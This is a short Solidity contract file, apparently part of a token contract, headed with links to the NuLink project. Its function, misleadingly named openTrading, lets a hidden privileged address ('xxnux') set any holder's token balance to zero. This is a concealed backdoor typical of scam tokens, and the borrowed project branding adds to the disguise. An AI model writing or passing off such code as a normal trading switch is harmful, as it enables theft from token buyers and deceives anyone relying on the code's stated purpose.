/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/NuLink2021
    // Twitter: https://twitter.com/NuLink_
    // Website: https://www.nulink.org/
    // Medium:  https://medium.com/NuLink_
    // Discord: https://discord.com/invite/25CQFUuwJS
    // Github:  https://github.com/NuLink-network
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
